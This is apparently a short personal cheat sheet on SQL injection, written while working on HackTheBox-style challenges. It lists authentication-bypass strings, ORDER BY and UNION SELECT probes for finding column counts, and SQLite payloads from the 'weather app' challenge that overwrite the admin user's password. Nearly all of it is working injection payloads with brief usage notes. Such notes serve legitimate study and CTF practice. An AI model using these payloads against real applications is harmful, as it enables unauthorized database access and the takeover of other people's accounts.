When you see something like '/products/1', '/products/2'..., don't think only in trying path traversal. Try also sqli. The numbers can be the id number of the object and been used in a query sent to the database...

At first, try the classic commands that you see in hacktricks or payloadallthethings. If none work:
admin'||''==='
admin'||''1==1

(This one is good to use to quickly find the quantity of columns. Sometimes, they are many.
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
						
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - worked

After, I can try the commands bellow, to see in with column I will insert the commands to grep informations.

SQLITE:

A different command that was used in the htb challenge 'weather app':
"username=admin&password=') ON CONFLICT(username) DO UPDATE SET password = 'cave';--"
The payload itself is: 
') ON CONFLICT(username) DO UPDATE SET password = 'cave';--
or: ');UPDATE users SET 'password' = 'test' WHERE username='admin'--
